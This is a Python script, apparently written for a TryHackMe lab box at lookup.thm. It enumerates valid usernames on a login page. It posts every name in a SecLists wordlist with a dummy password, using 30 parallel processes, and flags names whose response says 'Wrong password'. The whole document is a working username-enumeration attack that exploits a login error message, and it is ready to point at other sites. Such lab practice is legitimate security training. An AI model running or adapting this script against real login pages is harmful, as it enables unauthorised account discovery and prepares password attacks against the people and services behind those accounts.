import requests
import multiprocessing

target = 'http://lookup.thm/login.php'
username_file = '/usr/share/wordlists/seclists/Usernames/Names/names.txt'

def user_check(name):
    data = {"username": name, "password": "password"}
    try:
        response = requests.post(target, data=data, timeout=5)
        if "Wrong password" in response.text:
            print(f"User found: {name}")
    except requests.RequestException as e:
        print(f"[!] Error checking {name}: {e}")

if __name__ == "__main__":
    try:
        with open(username_file, 'r') as user_file:
            users = [line.strip() for line in user_file if line.strip()]

        # Use a pool with 30 worker processes
        with multiprocessing.Pool(processes=30) as pool:
            pool.map(user_check, users)

    except FileNotFoundError:
        print(f'Error: File path {username_file} does not exist.')
